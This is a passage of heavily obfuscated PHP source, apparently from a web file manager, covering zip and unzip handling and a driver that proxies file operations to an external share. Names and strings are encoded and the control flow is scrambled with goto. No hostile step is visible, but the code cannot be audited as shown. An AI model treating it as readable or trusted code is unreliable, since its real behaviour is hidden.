= $–«—ÊÍ›[$¹²Óù‰ë[1283]]; } $¼Êğ¼×´->path = $ó•é¼Ê¬; return $¼Êğ¼×´; } public static function errorTips($ûÔÜ¼š… = false, $ëÜš§ÒÌ = true) { $‡´Œ»ª =& $_SERVER[¤øïŠ‹²]; static $¥Ìæ£Ñˆ = array(); $ÆÍ•¥±Ê = 100; if ($ûÔÜ¼š… === -1) { return $¥Ìæ£Ñˆ ? $¥Ìæ£Ñˆ[count($¥Ìæ£Ñˆ) - 1] : $‡´Œ»ª[12]; } if ($ûÔÜ¼š… === !1) { return implode($‡´Œ»ª[59], $¥Ìæ£Ñˆ); } if (count($¥Ìæ£Ñˆ) >= $ÆÍ•¥±Ê) { $¥Ìæ£Ñˆ = array_slice($¥Ìæ£Ñˆ, $ÆÍ•¥±Ê * 0.5, $ÆÍ•¥±Ê); } $¥Ìæ£Ñˆ[] = $ûÔÜ¼š…; if (!$ëÜš§ÒÌ) { return; } write_log($‡´Œ»ª[186] . ACTION . $‡´Œ»ª[1316] . $ûÔÜ¼š…, $‡´Œ»ª[1317]); } public static function getLastError($óáë÷×â = '') { $Ø­á¾ïñ = self::errorTips(-1); return $Ø­á¾ïñ ? $Ø­á¾ïñ : $óáë÷×â; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ÿ¹†Úİ³; if ($Ÿ¹†Úİ³) { return $Ÿ¹†Úİ³; } $¾Ş‰ò¦‚ = IO::init($_SERVER[¤øïŠ‹²][8]); return $¾Ş‰ò¦‚; } private static function iconvSystem($ç¤÷‘·) { return self::local()->iconvSystem($ç¤÷‘·); } private static function iconvApp($•¿ĞÏ”³) { return self::local()->iconvApp($•¿ĞÏ”³); } public static function zipFolder($ó­•‘åÚ, $¶ê¶Ÿ•  = "\172\x69\160", $“÷Ş³—ˆ = '', $ö¾¢ìç· = REPEAT_RENAME) { $³õÑë´Ù =& $_SERVER[¤øïŠ‹²]; $š•ëúÊù = IO::listPath($ó­•‘åÚ); if (!$š•ëúÊù) { return !1; } $š•ëúÊù = array_merge($š•ëúÊù[$³õÑë´Ù[96]], $š•ëúÊù[$³õÑë´Ù[97]]); return self::zip($š•ëúÊù, $¶ê¶Ÿ• , $“÷Ş³—ˆ, $ö¾¢ìç·); } public static function zip($¨×ÕÄø¹, $Å„‚”÷ƒ = "\172\151\x70", $šÂ÷øÒŞ = '', $øìÚ’ş€ = REPEAT_RENAME) { $ûÙ€ä’õ =& $_SERVER[¤øïŠ‹²]; if (is_string($¨×ÕÄø¹) && $¨×ÕÄø¹) { $¨×ÕÄø¹ = array(array($ûÙ€ä’õ[98] => $¨×ÕÄø¹)); } $ñ‰Öì è = self::init($¨×ÕÄø¹[0][$ûÙ€ä’õ[98]]); $¶’†€ = self::info($¨×ÕÄø¹[0][$ûÙ€ä’õ[98]]); $Ê±ÄÈ®ë = $ûÙ€ä’õ[12]; $û†óĞ = $ûÙ€ä’õ[12]; $Üò³Àì® = $ûÙ€ä’õ[12]; if ($šÂ÷øÒŞ && substr($šÂ÷øÒŞ, -1, 1) != $ûÙ€ä’õ[8]) { $û†óĞ = get_path_father($šÂ÷øÒŞ); $Üò³Àì® = get_path_this($šÂ÷øÒŞ); } else { $û†óĞ = self::pathFather($¶’†€[$ûÙ€ä’õ[98]]); $Üò³Àì® = $¶’†€[$ûÙ€ä’õ[32]] . $ûÙ€ä’õ[10] . $Å„‚”÷ƒ; if (count($¨×ÕÄø¹) > 1) { $¾‡²Îãî = IO::info($û†óĞ); $Üò³Àì® = $¾‡²Îãî[$ûÙ€ä’õ[32]] . $ûÙ€ä’õ[10] . $Å„‚”÷ƒ; } if ($šÂ÷øÒŞ) { $û†óĞ = $šÂ÷øÒŞ; } } if ($ñ‰Öì è->getType() == $ûÙ€ä’õ[118]) { $ÙÅ´×œÏ = self::init($û†óĞ); $‡ˆŸ³ó = $ÙÅ´×œÏ->getType() == $ûÙ€ä’õ[118] ? $û†óĞ : get_path_father($ñ‰Öì è->path); $‡ˆŸ³ó = IO::getPathInner($‡ˆŸ³ó); $‡ˆŸ³ó = rtrim($‡ˆŸ³ó, $ûÙ€ä’õ[8]) . $ûÙ€ä’õ[8]; mk_dir($‡ˆŸ³ó); } else { $Ê±ÄÈ®ë = TEMP_FILES . $ûÙ€ä’õ[1318] . time() . rand_string(8) . $ûÙ€ä’õ[8]; mk_dir($Ê±ÄÈ®ë); file_put_contents($Ê±ÄÈ®ë . $ûÙ€ä’õ[1319], $ûÙ€ä’õ[12]); $‡ˆŸ³ó = $Ê±ÄÈ®ë; } $ÊÎ„…Âš = IO::info($‡ˆŸ³ó); if (!$ÊÎ„…Âš || !$ÊÎ„…Âš[$ûÙ€ä’õ[246]]) { show_json(LNG($ûÙ€ä’õ[1320]), !1); } $àşøÆÑÒ = self::zipFileList($¨×ÕÄø¹, $Ê±ÄÈ®ë); foreach ($àşøÆÑÒ as $ğÊ¿šîÆ => $’“îÆ™Â) { $àşøÆÑÒ[$ğÊ¿šîÆ] = self::iconvSystem($’“îÆ™Â); } $ªşÙËšÖ = get_filename_auto($‡ˆŸ³ó . $Üò³Àì®, $ûÙ€ä’õ[12], $øìÚ’ş€); KodArchive::create(self::iconvSystem($ªşÙËšÖ), $àşøÆÑÒ); if (!IO::exist($ªşÙËšÖ)) { if ($Ê±ÄÈ®ë) { del_dir($Ê±ÄÈ®ë); } write_log($ûÙ€ä’õ[1321] . $ªşÙËšÖ, $ûÙ€ä’õ[400]); show_json(LNG($ûÙ€ä’õ[1322]), !1); } if (!$Ê±ÄÈ®ë) { return $ªşÙËšÖ; } $è‡Á¼”Ò = self::move($ªşÙËšÖ, $û†óĞ, $øìÚ’ş€); if ($Ê±ÄÈ®ë) { del_dir($Ê±ÄÈ®ë); } if (!$ªşÙËšÖ) { write_log($ûÙ€ä’õ[1323] . $ªşÙËšÖ . $ûÙ€ä’õ[1324] . $û†óĞ, $ûÙ€ä’õ[400]); show_json(LNG($ûÙ€ä’õ[1322]), !1); } return $è‡Á¼”Ò; } public static function unzip($ãÇ»Üùì, $›²‹¾Ëú, $Õ™ø€ãç = "\55\x31", $à±ÑÜşÌ = "\x72\145\160\154\x61\x63\x65") { $ÈŸÃ¯ì =& $_SERVER[¤øïŠ‹²]; $Æ²ú»Ãâ = parent::info($ãÇ»Üùì); if (!$Æ²ú»Ãâ) { show_json(LNG($ÈŸÃ¯ì[1325]), !1); } $­¯ ¥Ñ“ = IO::infoFullSimple($›²‹¾Ëú); if (!$­¯ ¥Ñ“) { $›²‹¾Ëú = IO::mkdir($›²‹¾Ëú); } if (isset($­¯ ¥Ñ“[$ÈŸÃ¯ì[204]]) && trim($­¯ ¥Ñ“[$ÈŸÃ¯ì[98]], $ÈŸÃ¯ì[8]) != trim($›²‹¾Ëú, $ÈŸÃ¯ì[8])) { $¨—Œ = KodIO::make($­¯ ¥Ñ“[$ÈŸÃ¯ì[203]]); $‡¾¦”é­ = IO::fileNameAuto($¨—Œ, $­¯ ¥Ñ“[$ÈŸÃ¯ì[32]], REPEAT_RENAME_FOLDER, !0); $›²‹¾Ëú = IO::mkdir($¨—Œ . $‡¾¦”é­); } $Õ™ø€ãç = $Õ™ø€ãç && $Õ™ø€ãç != $ÈŸÃ¯ì[1326] ? @json_decode($Õ™ø€ãç, !0) : -1; $è•ª›ûµ = self::unzipPart($ãÇ»Üùì, $Õ™ø€ãç); if (!$è•ª›ûµ || !IO::exist($è•ª›ûµ[$ÈŸÃ¯ì[243]])) { show_json(LNG($ÈŸÃ¯ì[117]), !1); } $ÎÃ‰¿æå = $è•ª›ûµ[$ÈŸÃ¯ì[1327]][count($è•ª›ûµ[$ÈŸÃ¯ì[1327]]) - 1]; if ($ÎÃ‰¿æå[$ÈŸÃ¯ì[1255]] == -1 || substr($ÎÃ‰¿æå[$ÈŸÃ¯ì[32]], -1, 1) == $ÈŸÃ¯ì[8]) { $Òº·›ß = $è•ª›ûµ[$ÈŸÃ¯ì[1328]] . rand_string(10) . $ÈŸÃ¯ì[8]; mk_dir($Òº·›ß); $÷ Çù = count($è•ª›ûµ[$ÈŸÃ¯ì[1327]]) == 1 ? IO::ext($ãÇ»Üùì) : get_path_ext($è•ª›ûµ[$ÈŸÃ¯ì[243]]); $šÇ»Òáü = KodArchive::extract(self::iconvSystem($è•ª›ûµ[$ÈŸÃ¯ì[243]]), $Òº·›ß, $ÎÃ‰¿æå[$ÈŸÃ¯ì[1255]], $‡¾¦”é­, $÷ Çù); self::unzipErrorCheck($šÇ»Òáü, array($ÈŸÃ¯ì[1329], $ãÇ»Üùì, $÷ Çù, $›²‹¾Ëú, $è•ª›ûµ)); Hook::trigger($ÈŸÃ¯ì[1330], $Òº·›ß); recursion_dir($Òº·›ß, $û¨™úı›, $ãşØ¡×¦, 0); $¬±øóüå = array_merge($û¨™úı›, $ãşØ¡×¦); $Ò©ƒŠÀ = array(); foreach ($¬±øóüå as $ÀÈÈõšæ) { $¥³ˆåâ = IO::move(self::iconvApp($ÀÈÈõšæ), $›²‹¾Ëú, $à±ÑÜşÌ); if ($¥³ˆåâ) { $Ò©ƒŠÀ[] = $¥³ˆåâ; } } del_dir($Òº·›ß); } else { $¥³ˆåâ = IO::move($è•ª›ûµ[$ÈŸÃ¯ì[243]], $›²‹¾Ëú, $à±ÑÜşÌ, get_path_this($ÎÃ‰¿æå[$ÈŸÃ¯ì[32]])); if ($¥³ˆåâ) { $Ò©ƒŠÀ[] = $¥³ˆåâ; } } return $Ò©ƒŠÀ ? $Ò©ƒŠÀ : !1; } public static function unzipList($¨ñ—˜Æß) { $éëÍ¢¿å =& $_SERVER[¤øïŠ‹²]; $‰Ô««Š = isset($¨ñ—˜Æß[$éëÍ¢¿å[1331]]) ? $¨ñ—˜Æß[$éëÍ¢¿å[1331]] : !1; $¹—™ï†Ì = isset($¨ñ—˜Æß[$éëÍ¢¿å[1255]]) ? @json_decode($¨ñ—˜Æß[$éëÍ¢¿å[1255]], !0) : -1; $ÏÁßÎÙõ = self::unzipPart($¨ñ—˜Æß[$éëÍ¢¿å[98]], $¹—™ï†Ì); if (!$ÏÁßÎÙõ || !IO::exist($ÏÁßÎÙõ[$éëÍ¢¿å[243]])) { show_json(LNG($éëÍ¢¿å[117]), !1); } $òéÊçÎç = $ÏÁßÎÙõ[$éëÍ¢¿å[1327]][count($ÏÁßÎÙõ[$éëÍ¢¿å[1327]]) - 1]; $é ç¢çâ = in_array(IO::ext($ÏÁßÎÙõ[$éëÍ¢¿å[243]]), array($éëÍ¢¿å[400], $éëÍ¢¿å[1332], $éëÍ¢¿å[1333], $éëÍ¢¿å[1334], $éëÍ¢¿å[1335], $éëÍ¢¿å[1336])); if (!$‰Ô««Š && ($òéÊçÎç[$éëÍ¢¿å[1255]] == -1 || $é ç¢çâ)) { $©ÒÚ—÷ = $ÏÁßÎÙõ[$éëÍ¢¿å[1328]] . get_path_this($ÏÁßÎÙõ[$éëÍ¢¿å[243]]) . $éëÍ¢¿å[1337]; if (!IO::exist($©ÒÚ—÷)) { $´ÒĞá·— = $òéÊçÎç[$éëÍ¢¿å[1255]] == -1 ? get_path_ext(IO::pathThis($¨ñ—˜Æß[$éëÍ¢¿å[98]])) : get_path_ext($ÏÁßÎÙõ[$éëÍ¢¿å[243]]); $©éŒÁ = KodArchive::listContent(self::iconvSystem($ÏÁßÎÙõ[$éëÍ¢¿å[243]]), !0, $´ÒĞá·—); self::unzipErrorCheck($©éŒÁ, array($éëÍ¢¿å[1338], $¨ñ—˜Æß, $ÏÁßÎÙõ)); @file_put_contents($©ÒÚ—÷, json_encode($©éŒÁ[$éëÍ¢¿å[1339]])); } return @json_decode(IO::getContent($©ÒÚ—÷), !0); } IO::fileOut($ÏÁßÎÙõ[$éëÍ¢¿å[243]], $‰Ô««Š, get_path_this($òéÊçÎç[$éëÍ¢¿å[32]])); die; } private static function zipFileList($’İáâ£, $ƒùœßá = false) { $¦÷å½ÅË =& $_SERVER[¤øïŠ‹²]; $¦ÄÆÉº = array(); foreach ($’İáâ£ as $Í¬ğ¢°) { $‰Î•ŸÁù = $Í¬ğ¢°[$¦÷å½ÅË[98]]; if ($ƒùœßá) { $‰Î•ŸÁù = self::copy($Í¬ğ¢°[$¦÷å½ÅË[98]], $ƒùœßá, $¦÷å½ÅË[928]); } else { $È¹¼ œ› = self::init($Í¬ğ¢°[$¦÷å½ÅË[98]]); if ($È¹¼ œ›->getType() == $¦÷å½ÅË[118]) { $‰Î•ŸÁù = $È¹¼ œ›->path; } } if ($‰Î•ŸÁù && self::local()->exist($‰Î•ŸÁù)) { $¦ÄÆÉº[$Í¬ğ¢°[$¦÷å½ÅË[98]]] = $‰Î•ŸÁù; } } if (!empty($¦ÄÆÉº)) { return array_values($¦ÄÆÉº); } show_json(LNG($¦÷å½ÅË[1297]), !1); } private static function localFilePath($ó·¿Ï˜ï) { $—»©„ğ =& $_SERVER[¤øïŠ‹²]; $ÍÎµì´õ = KodIO::parse($ó·¿Ï˜ï); if ($ÍÎµì´õ[$—»©„ğ[33]] == KodIO::KOD_SOURCE) { $¶©Ï×ûâ = Model($—»©„ğ[934])->fileInfoGet(KodIO::sourceID($ó·¿Ï˜ï)); if (!$¶©Ï×ûâ[$—»©„ğ[98]]) { show_json($—»©„ğ[1340], !1); } $ó·¿Ï˜ï = $¶©Ï×ûâ[$—»©„ğ[98]]; } $íªŒˆ»™ = self::init($ó·¿Ï˜ï); if ($íªŒˆ»™->pathParse[$—»©„ğ[1283]]) { $ó·¿Ï˜ï = $íªŒˆ»™->pathParse[$—»©„ğ[1283]]; $íªŒˆ»™ = self::init($ó·¿Ï˜ï); } $üˆÚÄêœ = $íªŒˆ»™->getType(); if ($üˆÚÄêœ == $—»©„ğ[118] || $üˆÚÄêœ == $—»©„ğ[1341]) { if (!$íªŒˆ»™->exist($íªŒˆ»™->path)) { show_json(LNG($—»©„ğ[117]), !1); } return $íªŒˆ»™->path; } return !1; } public static function unzipPart($î¸µÛ»İ, $¥¨»±íı = -1) { $Ã¯±İ± =& $_SERVER[¤øïŠ‹²]; $½ñö¬ñ¸ = IO::pathThis($î¸µÛ»İ); if (!$¥¨»±íı || $¥¨»±íı == -1) { $É¡¡Ò¡ = array(array($Ã¯±İ±[32] => $½ñö¬ñ¸, $Ã¯±İ±[1255] => -1)); $É¡¡Ò¡[0][$Ã¯±İ±[1342]] = $É¡¡Ò¡[0][$Ã¯±İ±[32]]; } else { if (is_array($¥¨»±íı)) { $É¡¡Ò¡ = $¥¨»±íı; $ÁÚ´‘ = count($É¡¡Ò¡) - 1; for ($Ì¸Ğ…ºÔ = 0; $Ì¸Ğ…ºÔ <= $ÁÚ´‘; $Ì¸Ğ…ºÔ++) { $ØÁâª³ = $É¡¡Ò¡[$Ì¸Ğ…ºÔ]; $·ÈüĞõ = get_path_this($ØÁâª³[$Ã¯±İ±[32]]) . (checkExtSafe($ØÁâª³[$Ã¯±İ±[32]]) ? $Ã¯±İ±[12] : $Ã¯±İ±[1343]); $É¡¡Ò¡[$Ì¸Ğ…ºÔ][$Ã¯±İ±[1342]] = $Ã¯±İ±[1344] . intval($ØÁâª³[$Ã¯±İ±[1255]]) . $Ã¯±İ±[483] . $·ÈüĞõ; if ($Ì¸Ğ…ºÔ == 0) { continue; } $É¡¡Ò¡[$Ì¸Ğ…ºÔ][$Ã¯±İ±[1342]] = $É¡¡Ò¡[$Ì¸Ğ…ºÔ - 1][$Ã¯±İ±[1342]] . $Ã¯±İ±[1345] . $É¡¡Ò¡[$Ì¸Ğ…ºÔ][$Ã¯±İ±[1342]]; } } } if (!is_array($É¡¡Ò¡) || count($É¡¡Ò¡) == 0) { return !1; } $Şà¨‘í = $É¡¡Ò¡[count($É¡¡Ò¡) - 1]; if (!IO::exist($î¸µÛ»İ)) { return !1; } $ˆ¬œÙäÚ = TEMP_FILES . $Ã¯±İ±[1346] . kodIO::hashPathSafe($î¸µÛ»İ) . $Ã¯±İ±[8]; $åµãµı = $ˆ¬œÙäÚ . $Şà¨‘í[$Ã¯±İ±[1342]]; mk_dir($ˆ¬œÙäÚ); file_put_contents(TEMP_FILES . $Ã¯±İ±[1319], $Ã¯±İ±[12]); if (IO::exist($åµãµı)) { return array($Ã¯±İ±[243] => $åµãµı, $Ã¯±İ±[1327] => $É¡¡Ò¡, $Ã¯±İ±[1328] => $ˆ¬œÙäÚ); } $ñİ¡ÀÖ¤ = self::localFilePath($î¸µÛ»İ); if (!$ñİ¡ÀÖ¤) { $ñİ¡ÀÖ¤ = $ˆ¬œÙäÚ . $Ã¯±İ±[1347]; if (!IO::exist($ñİ¡ÀÖ¤)) { self::copy($î¸µÛ»İ, $ˆ¬œÙäÚ, !1, get_path_this($ñİ¡ÀÖ¤)); } } if (!$ñİ¡ÀÖ¤ || !IO::exist($ñİ¡ÀÖ¤)) { return !1; } if ($Şà¨‘í[$Ã¯±İ±[1255]] == -1) { return array($Ã¯±İ±[243] => $ñİ¡ÀÖ¤, $Ã¯±İ±[1327] => $É¡¡Ò¡, $Ã¯±İ±[1328] => $ˆ¬œÙäÚ); } $×ĞŸ—éÆ = $ñİ¡ÀÖ¤; foreach ($É¡¡Ò¡ as $Ì¸Ğ…ºÔ => $ØÁâª³) { if (!$ØÁâª³ || $ØÁâª³[$Ã¯±İ±[1255]] == $Ã¯±İ±[1326]) { break; } if (substr($ØÁâª³[$Ã¯±İ±[32]], -1, 1) == $Ã¯±İ±[8]) { break; } $ìÈÜëß« = in_array(get_path_ext($ØÁâª³[$Ã¯±İ±[1342]]), array($Ã¯±İ±[400], $Ã¯±İ±[1332], $Ã¯±İ±[1333], $Ã¯±İ±[1334], $Ã¯±İ±[1335], $Ã¯±İ±[1336])); $ğ”Â«¹ü = $Ì¸Ğ…ºÔ == count($É¡¡Ò¡) - 1 && $ìÈÜëß«; $ş¡ØÑâò = $ˆ¬œÙäÚ . $ØÁâª³[$Ã¯±İ±[1342]]; $È—ÔäÂ’ = $ˆ¬œÙäÚ . get_path_this($ØÁâª³[$Ã¯±İ±[32]]); if (IO::exist($ş¡ØÑâò)) { $×ĞŸ—éÆ = $ş¡ØÑâò; continue; } $ºàùó–› = $Ì¸Ğ…ºÔ == 0 ? get_path_ext($½ñö¬ñ¸) : get_path_ext($×ĞŸ—éÆ); $õğš˜»Ô = KodArchive::extract(self::iconvSystem($×ĞŸ—éÆ), $ˆ¬œÙäÚ, $ØÁâª³[$Ã¯±İ±[1255]], $Ûƒã½¡×, $ºàùó–›); self::unzipErrorCheck($õğš˜»Ô, array($Ã¯±İ±[1348], $î¸µÛ»İ, $É¡¡Ò¡, $ØÁâª³, $ş¡ØÑâò)); if (IO::exist($È—ÔäÂ’)) { IO::rename($È—ÔäÂ’, get_path_this($ş¡ØÑâò)); } $×ĞŸ—éÆ = $ş¡ØÑâò; } $åµãµı = $×ĞŸ—éÆ; return array($Ã¯±İ±[243] => $×ĞŸ—éÆ, $Ã¯±İ±[1327] => $É¡¡Ò¡, $Ã¯±İ±[1328] => $ˆ¬œÙäÚ); } private static function unzipErrorCheck($‡¨é’Á•, $”ë¿ä€Ë = false) { $îåë× =& $_SERVER[¤øïŠ‹²]; if ($‡¨é’Á•[$îåë×[1349]]) { return !0; } write_log(array($îåë×[1350], $‡¨é’Á•, $”ë¿ä€Ë), $îåë×[1351]); $õ‰Àë´Š = is_array($‡¨é’Á•[$îåë×[1339]]) ? json_encode($‡¨é’Á•[$îåë×[1339]]) : $‡¨é’Á•[$îåë×[1339]]; show_json($îåë×[1352] . $õ‰Àë´Š, !1); die; } } goto d…—ô—•; F³Ê‚öÂØÎ: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($¹Æ¹¼ìš) { $·„É£é› =& $_SERVER[¤øïŠ‹²]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $¹Æ¹¼ìš; $ÌÉï“œ˜ = Model($·„É£é›[693])->getInfo($¹Æ¹¼ìš[$·„É£é›[493]]); $œØ•ù‰ = _get($ÌÉï“œ˜, $·„É£é›[586]); $¿œ€”Œ˜ = Model($·„É£é›[593])->authMake(_get($ÌÉï“œ˜, $·„É£é›[1500])); if (!$ÌÉï“œ˜) { IO::errorTips(LNG($·„É£é›[1501]), !1); } if (!$¿œ€”Œ˜) { IO::errorTips(LNG($·„É£é›[1502]), !1); } if ($œØ•ù‰ && is_string($œØ•ù‰)) { $œØ•ù‰ = json_decode($œØ•ù‰, !0); } if (!$œØ•ù‰ || !$¿œ€”Œ˜) { return; } $this->_config = array($·„É£é›[1303] => rtrim($¹Æ¹¼ìš[$·„É£é›[1303]], $·„É£é›[8]) . $·„É£é›[8], $·„É£é›[1503] => $·„É£é›[1410] . $œØ•ù‰[$·„É£é›[1504]] . $·„É£é›[505], $·„É£é›[582] => $ÌÉï“œ˜, $·„É£é›[586] => $œØ•ù‰, $·„É£é›[1505] => $¿œ€”Œ˜, $·„É£é›[1506] => substr(APP_HOST, 0, 8) == $·„É£é›[230], $·„É£é›[1507] => Model($·„É£é›[597])->authCheck($¿œ€”Œ˜[$·„É£é›[509]], AuthModel::AUTH_VIEW, !1), $·„É£é›[1508] => Model($·„É£é›[597])->authCheck($¿œ€”Œ˜[$·„É£é›[509]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($¢™ÊÈş—) { $®İ•Û¢ =& $_SERVER[¤øïŠ‹²]; $ÕµİÉ²Ò = $this->_config; if (!$ÕµİÉ²Ò) { return !1; } $®Å‡ø¥ğ = array($®İ•Û¢[1509] => $ÕµİÉ²Ò[$®İ•Û¢[1507]], $®İ•Û¢[1510] => $ÕµİÉ²Ò[$®İ•Û¢[1507]], $®İ•Û¢[1331] => $ÕµİÉ²Ò[$®İ•Û¢[1507]], $®İ•Û¢[119] => $ÕµİÉ²Ò[$®İ•Û¢[1508]], $®İ•Û¢[1511] => $ÕµİÉ²Ò[$®İ•Û¢[1508]], $®İ•Û¢[1280] => $ÕµİÉ²Ò[$®İ•Û¢[1508]], $®İ•Û¢[1512] => !1, $®İ•Û¢[441] => !1, $®İ•Û¢[1513] => !1, $®İ•Û¢[1514] => !1); return $®Å‡ø¥ğ[$¢™ÊÈş—]; } public function listPath($¨Ú–ƒØé, $¡ÔÍÛµÔ = false) { return $this->request($_SERVER[¤øïŠ‹²][1515], array($¨Ú–ƒØé)); } public function setContent($Œ£öìÛ, $”ìª¿ğ = '') { return $this->request($_SERVER[¤øïŠ‹²][1516], array($Œ£öìÛ, $”ìª¿ğ)); } public function getContent($¢£İ®ç€) { return $this->_fileSubstr($¢£İ®ç€); } public function fileSubstr($ÒèŒ°‰Ù, $Ï¯ª’Òò, $úªÍã÷») { return $this->_fileSubstr($ÒèŒ°‰Ù, $Ï¯ª’Òò, $úªÍã÷»); } public function download($ ïÔç€¿, $°ø«—Ü‚) { return $this->_download($ ïÔç€¿, $°ø«—Ü‚); } public function isFileOutServer() { return !1; } public function fileOut($±ÇŸÈó, $ª´–“Ìç = false, $œÖìä°ã = false, $àäÂı˜° = '') { $Ñı¬˜øÚ =& $_SERVER[¤øïŠ‹²]; $this->fileOutLink($this->_fileLink($±ÇŸÈó, ($àäÂı˜° ? $Ñı¬˜øÚ[1517] . $àäÂı˜° : $Ñı¬˜øÚ[12]) . ($ª´–“Ìç ? $Ñı¬˜øÚ[1518] : $Ñı¬˜øÚ[12]))); } public function fileOutImage($¼ü‹¶€Õ, $„ê†Ç¿º = 250) { $this->fileOutLink($this->_fileLink($¼ü‹¶€Õ, $_SERVER[¤øïŠ‹²][1519] . $„ê†Ç¿º)); } public function fileOutLink($ÙôÛËç’) { header($_SERVER[¤øïŠ‹²][185] . $this->urlAuto($ÙôÛËç’)); die; } public function exist($ã«”“ŸÚ) { $²¸ãÀì­ = $this->_info($ã«”“ŸÚ); return $²¸ãÀì­ ? !0 : !1; } public function isFile($ë³‚Ê–€) { $ëœ÷°«ò =& $_SERVER[¤øïŠ‹²]; $äĞş¥Â¾ = $this->_info($ë³‚Ê–€); return _get($äĞş¥Â¾, $ëœ÷°«ò[33], $ëœ÷°«ò[12]) == $ëœ÷°«ò[243]; } public function isFolder($Ë˜±ñ‹) { $®ûÕí”¾ =& $_SERVER[¤øïŠ‹²]; $Ó€€İÓ– = $this->_info($Ë˜±ñ‹); return _get($Ó€€İÓ–, $®ûÕí”¾[33], $®ûÕí”¾[12]) == $®ûÕí”¾[89]; } public function size($„¹Û¡ø) { $ çìê“Ù = $this->_info($„¹Û¡ø); return _get($ çìê“Ù, $_SERVER[¤øïŠ‹²][90], 0); } public function info($ñ¦Ş°ñ«) { return $this->_info($ñ¦Ş°ñ«); } public function infoAuth($š¼ÇÄ¤) { return $this->_info($š¼ÇÄ¤); } public function infoFull($ä™ûÑ­) { return $this->_info($ä™ûÑ­); } public function infoFullSimple($Ó¤Úà¸í) { return $this->_info($Ó¤Úà¸í); } public function infoWithChildren($•³Š®‚) { return $this->_info($•³Š®‚, !0); } public function has($×ù¼¶Ôè, $òíªàµ = false, $—…Ä¡Îî = false) { $ÙÅÃÄ =& $_SERVER[¤øïŠ‹²]; $‡è…ŞÕå = $this->_info($×ù¼¶Ôè); if (!$‡è…ŞÕå) { return !1; } if ($òíªàµ) { return array($ÙÅÃÄ[252] => $‡è…ŞÕå[$ÙÅÃÄ[252]], $ÙÅÃÄ[253] => $‡è…ŞÕå[$ÙÅÃÄ[253]]); } return $Ãƒàù± ? $‡è…ŞÕå[$ÙÅÃÄ[252]] > 0 : $‡è…ŞÕå[$ÙÅÃÄ[253]] > 0; } public function mkfile($æ´ê‚Ğ, $·ıÁæá» = '', $ÍÃ“åò— = REPEAT_RENAME) { return $this->request($_SERVER[¤øïŠ‹²][1492], array($æ´ê‚Ğ, $·ıÁæá», $ÍÃ“åò—)); } public function mkdir($µìûú°û, $±ÏˆÏİ = REPEAT_SKIP) { return $this->request($_SERVER[¤øïŠ‹²][1493], array($µìûú°û, $±ÏˆÏİ)); } public function remove($É´©éÎ©) { return $this->request($_SERVER[¤øïŠ‹²][1280], array($É´©éÎ©)); } public function rename($Œœ³ÂÌş, $€úÓ˜İ¶) { return $this->request($_SERVER[¤øïŠ‹²][1496], array($Œœ³ÂÌş, $€úÓ˜İ¶)); } public function moveSameAllow() { } public function copy($›ñé”¥Ò, $Ä—û‚Ó®, $ÙÆÎ¡é = REPEAT_REPLACE, $øÍÄ§ö = false) { return $this->request($_SERVER[¤øïŠ‹²][647], array($›ñé”¥Ò, $Ä—û‚Ó®, $ÙÆÎ¡é)); } public function move($ÖßÓ¯Ñö, $šÎßĞş¶, $æÔˆ¯ßÎ = REPEAT_REPLACE, $Úşı´â = false) { return $this->request($_SERVER[¤øïŠ‹²][649], array($ÖßÓ¯Ñö, $šÎßĞş¶, $æÔˆ¯ßÎ)); } public function uploadLink($ïêÊ÷óå, $½›É·¡ˆ = 0) { $Š²°ëÂü =& $_SERVER[¤øïŠ‹²]; $¸•¡èª‰ = IO::init($GLOBALS[$Š²°ëÂü[7]][$Š²°ëÂü[98]]); $•±ı±£ = $this->pathApiEncode($¸•¡èª‰->path); $âä»ş‰° = $this->requestMakeUrl($Š²°ëÂü[1520], array($Š²°ëÂü[98] => $•±ı±£)); return array($Š²°ëÂü[1521] => $âä»ş‰°); } public function upload($ƒ¹•“™ï, $ã¨›½ÃÄ, $¢¬µı»ğ = false, $’š×ÀòÑ = REPEAT_REPLACE) { $‘ …Ë =& $_SERVER[¤øïŠ‹²]; if (filesize($ã¨›½ÃÄ) < $this->uploadChunkSize) { return $this->request($‘ …Ë[119], array($ƒ¹•“™ï, $ã¨›½ÃÄ, $’š×ÀòÑ)); } $Á–øº‹ = $this->uploadHashCheck($ƒ¹•“™ï, $ã¨›½ÃÄ, $’š×ÀòÑ); if ($Á–øº‹) { return $Á–øº‹; } $Àµß«º = @filesize($ã¨›½ÃÄ); $Ğ¶ÅÍ³¢ = $this->uploadChunkSize; $Ëûèˆø = ceil($Àµß«º / $Ğ¶ÅÍ³¢); $¾şÉÑîª = 0; while ($¾şÉÑîª < $Ëûèˆø) { $Î·ßâçÍ = IO::fileSubstr($ã¨›½ÃÄ, $¾şÉÑîª * $Ğ¶ÅÍ³¢, $Ğ¶ÅÍ³¢); $¢¿šÓŞî = $this->tempFile($‘ …Ë[12], $Î·ßâçÍ); $æ«®Ş¿Ë = array($‘ …Ë[90] => $Àµß«º, $‘ …Ë[1522] => $Ğ¶ÅÍ³¢, $‘ …Ë[1523] => $Ëûèˆø, $‘ …Ë[1524] => $¾şÉÑîª); $‚Ãòá¤ = $this->uploadSend($ƒ¹•“™ï, $¢¿šÓŞî, $æ«®Ş¿Ë, $’š×ÀòÑ); $¾şÉÑîª++; if (!$‚Ãòá¤) { return !1; } } if (!is_array($‚Ãòá¤) || empty($‚Ãòá¤[$‘ …Ë[601]])) { return !1; } return $this->pathApiDecode($‚Ãòá¤[$‘ …Ë[601]]); } private function uploadHashCheck($­ùŠáêñ, $ù·ÜÒë¶, $ÀİşÍ„ã) { $á¹ÉÀ’ =& $_SERVER[¤øïŠ‹²]; $ûÂ Âº¨ = IO::hashSimple($ù·ÜÒë¶); $¸ºøÅäí = array($á¹ÉÀ’[1525] => $á¹ÉÀ’[1526], $á¹ÉÀ’[1484] => $ûÂ Âº¨); $¾­À¾×€ = $this->uploadSend($­ùŠáêñ, $á¹ÉÀ’[12], $¸ºøÅäí, $ÀİşÍ„ã); $¤ÜÓéëî = _get($¾­À¾×€, $á¹ÉÀ’[601], array()); $Å®”íå· = _get($¤ÜÓéëî, $á¹ÉÀ’[1527]); if (!is_array($Å®”íå·) || !$Å®”íå·[$á¹ÉÀ’[569]]) { return !1; } $…Ş®’‘Ë = IO::hashMd5($ù·ÜÒë¶); if 